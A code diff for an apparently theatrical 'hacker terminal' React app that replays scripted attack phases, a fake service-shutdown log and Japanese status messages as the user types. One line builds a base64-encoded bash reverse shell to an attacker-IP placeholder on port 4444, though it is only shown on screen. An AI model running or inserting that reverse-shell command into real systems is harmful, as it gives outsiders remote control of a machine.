@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { ALL_PHASE_TEMPLATES, REAL_CVE_DATABASE, AUTO_LOGS } from './data';
+import { ALL_PHASE_TEMPLATES, REAL_CVE_DATABASE, AUTO_LOGS, MAX_PHASE, PHASE_NUMBERS, INITIAL_PHASE_MESSAGES, SHUTDOWN_LOGS } from './data';
 
 const App: React.FC = () => {
   const [displayedLogs, setDisplayedLogs] = useState<string[]>([]);
@@ -14,6 +14,7 @@ const App: React.FC = () => {
   const [waitingForEnter, setWaitingForEnter] = useState(false);
   const [isSearching, setIsSearching] = useState(false);
   const [autoIdx, setAutoIdx] = useState<number>(-1);
+  const [shutdownIdx, setShutdownIdx] = useState<number>(-1);
   
   const [cpuLoad, setCpuLoad] = useState<number>(12.4);
   const [netTraffic, setNetTraffic] = useState<string>("240.5 KB/s");
@@ -28,7 +29,7 @@ const App: React.FC = () => {
       try {
         const response = await fetch(`https://dns.google/resolve?name=${targetDomain}&type=A`);
         const data = await response.json();
-        setRawJSON(JSON.stringify(data, null, 2)); // 整形されたJSON
+        setRawJSON(JSON.stringify(data, null, 2));
         if (data.Answer?.[0]) setTargetIP(data.Answer[0].data);
       } catch (e) { setTargetIP("104.16.148.244"); }
       try {
@@ -58,15 +59,13 @@ const App: React.FC = () => {
     if (autoIdx >= AUTO_LOGS.length) {
       setAutoIdx(-1);
       logIndexRef.current += 1;
-      
-      // 自動ログ終了後にフェーズ完了チェックを行う
       const current = ALL_PHASE_TEMPLATES[phase];
       if (current && logIndexRef.current >= current.length) {
-        if (phase < 7) {
+        if (phase < MAX_PHASE) {
           setWaitingForEnter(true);
           setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
         } else {
-          setActiveMessage("防衛システムの無力化が完了しました。");
+          setActiveMessage("全シーケンスが完了しました。");
           setActiveTask("MISSION ACCOMPLISHED");
         }
       }
@@ -79,24 +78,47 @@ const App: React.FC = () => {
     return () => clearTimeout(timer);
   }, [autoIdx, phase]);
 
+  useEffect(() => {
+    if (shutdownIdx === -1) return;
+    if (shutdownIdx >= SHUTDOWN_LOGS.length) {
+      setShutdownIdx(-1);
+      logIndexRef.current += 1;
+      const current = ALL_PHASE_TEMPLATES[phase];
+      if (current && logIndexRef.current >= current.length) {
+        if (phase < MAX_PHASE) {
+          setWaitingForEnter(true);
+          setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
+        } else {
+          setActiveMessage("全シーケンスが完了しました。");
+          setActiveTask("MISSION ACCOMPLISHED");
+        }
+      }
+      return;
+    }
+    const timer = setTimeout(() => {
+      setDisplayedLogs(prev => [...prev, SHUTDOWN_LOGS[shutdownIdx]]);
+      setShutdownIdx(prev => prev + 1);
+    }, 300);
+    return () => clearTimeout(timer);
+  }, [shutdownIdx, phase]);
+
   const jumpToPhase = (p: number) => {
-    if (p > 7) return;
+    if (p > MAX_PHASE) return;
     setPhase(p);
     logIndexRef.current = 0;
     keyCounterRef.current = 0;
     setWaitingForEnter(false);
     setIsSearching(false);
     setAutoIdx(-1);
+    setShutdownIdx(-1);
     setDisplayedLogs([]);
-    const msgs = ["", "Initializing...", "Phase 2...", "Phase 3...", "Phase 4...", "Phase 5...", "Phase 6...", "Phase 7..."];
-    setActiveMessage(msgs[p]);
+    setActiveMessage(INITIAL_PHASE_MESSAGES[p]);
     setActiveTask("INITIALIZING...");
   };
 
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
-      // 入力中や待機中、自動実行中は無視
-      if (isSearching || autoIdx !== -1) return;
+      if (isSearching || autoIdx !== -1 || shutdownIdx !== -1) return;
 
       if (waitingForEnter) {
         if (e.key === 'Enter') {
@@ -106,12 +128,11 @@ const App: React.FC = () => {
         return;
       }
 
-      // Enterキー自体がログを進めるキーとして機能するように調整
       if (e.key.length > 1 && !['Enter', 'Space', 'Backspace'].includes(e.key)) return;
       
       keyCounterRef.current += 1;
       if (keyCounterRef.current >= 2) {
-        keyCounterRef.current = 0; // ここでリセット
+        keyCounterRef.current = 0;
         const current = ALL_PHASE_TEMPLATES[phase];
         if (!current || logIndexRef.current >= current.length) return;
         
@@ -127,14 +148,12 @@ const App: React.FC = () => {
             setDisplayedLogs(prev => [...prev, "Complete."]);
             setIsSearching(false);
             logIndexRef.current += 1;
-            
-            // 検索完了後のフェーズ終了判定
             if (logIndexRef.current >= current.length) {
-              if (phase < 7) {
+              if (phase < MAX_PHASE) {
                 setWaitingForEnter(true);
                 setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
               } else {
-                setActiveMessage("防衛システムの無力化が完了しました。");
+                setActiveMessage("全シーケンスが完了しました。");
                 setActiveTask("MISSION ACCOMPLISHED");
               }
             }
@@ -142,6 +161,9 @@ const App: React.FC = () => {
           return;
         } else if (item.log === "{AUTO_PIPELINE}") {
           setAutoIdx(0);
+          return;
+        } else if (item.log === "{SHUTDOWN_SEQUENCE}") {
+          setShutdownIdx(0);
           return;
         } else {
           const line = item.log.replace(/{IP}/g, targetIP).replace(/{DOMAIN}/g, targetDomain).replace(/{ATTACKER_IP}/g, attackerIP).replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
@@ -153,11 +175,11 @@ const App: React.FC = () => {
         logIndexRef.current += 1;
 
         if (logIndexRef.current >= current.length) {
-          if (phase < 7) {
+          if (phase < MAX_PHASE) {
             setWaitingForEnter(true);
             setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
           } else {
-            setActiveMessage("防衛システムの無力化が完了しました。");
+            setActiveMessage("全シーケンスが完了しました。");
             setActiveTask("MISSION ACCOMPLISHED");
           }
         }
@@ -165,7 +187,7 @@ const App: React.FC = () => {
     };
     window.addEventListener('keydown', handleKeyDown);
     return () => window.removeEventListener('keydown', handleKeyDown);
-  }, [targetIP, attackerIP, rawJSON, gccOutput, phase, waitingForEnter, isSearching, autoIdx]);
+  }, [targetIP, attackerIP, rawJSON, gccOutput, phase, waitingForEnter, isSearching, autoIdx, shutdownIdx]);
 
   useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [displayedLogs]);
 
@@ -189,6 +211,10 @@ const App: React.FC = () => {
                 ${log.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
                 ${log.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
                 ${log.startsWith('[!]') ? 'text-red-500 font-black' : ''}
+                ${log.startsWith('[  OK  ]') ? 'text-[#00ff41] font-bold' : ''}
+                ${log.startsWith('●') ? 'text-red-500 animate-pulse' : ''}
+                ${log.includes('Active: deactivating') ? 'text-yellow-400 italic' : ''}
+                ${log.includes('Main PID:') ? 'text-white/70' : ''}
               `}>{log}</span>
             </div>
           ))}
@@ -197,7 +223,7 @@ const App: React.FC = () => {
               {isTarget ? (displayedLogs.findLast(l => l?.includes('root')) ? 'root@target-server:/#' : 'www-data@target-server:/$') : 'root@hacker_os:~#'}
             </span>
             {waitingForEnter ? <span className="text-white font-bold text-sm bg-green-900 px-2 py-1 ml-2 border border-white/20">PRESS [ENTER]</span> : 
-             autoIdx !== -1 ? <span className="text-purple-400 font-bold text-sm ml-2 tracking-widest uppercase">Pipeline Intercepting... [AUTO]</span> :
+             autoIdx !== -1 || shutdownIdx !== -1 ? <span className="text-purple-400 font-bold text-sm ml-2 tracking-widest uppercase">Executing Payload... [AUTO]</span> :
              <span className={`w-2.5 h-5 ${isTarget ? 'bg-[#ffb000]' : 'bg-[#00ff41]'}`}></span>}
           </div>
           <div ref={bottomRef} />
@@ -205,7 +231,7 @@ const App: React.FC = () => {
       </div>
       <div className="w-1/3 h-full bg-[#001100] p-10 flex flex-col z-20 shadow-[-10px_0_30px_rgba(0,0,0,0.5)] border-l border-[#00ff41]/10 overflow-hidden">
         <div className="mb-6 flex gap-2 overflow-x-auto pb-2 scrollbar-hide shrink-0">
-          {[1, 2, 3, 4, 5, 6, 7].map((p) => (
+          {PHASE_NUMBERS.map((p) => (
             <button key={p} onClick={() => jumpToPhase(p)} className={`text-[11px] px-3 py-1 border transition-all duration-300 ${phase === p ? 'bg-[#00ff41] text-black border-[#00ff41] font-bold shadow-[0_0_10px_rgba(0,255,0,0.5)]' : 'bg-transparent text-[#00ff41] border-[#00ff41]/30 hover:border-[#00ff41]'}`}>PHASE {p}</button>
           ))}
         </div>
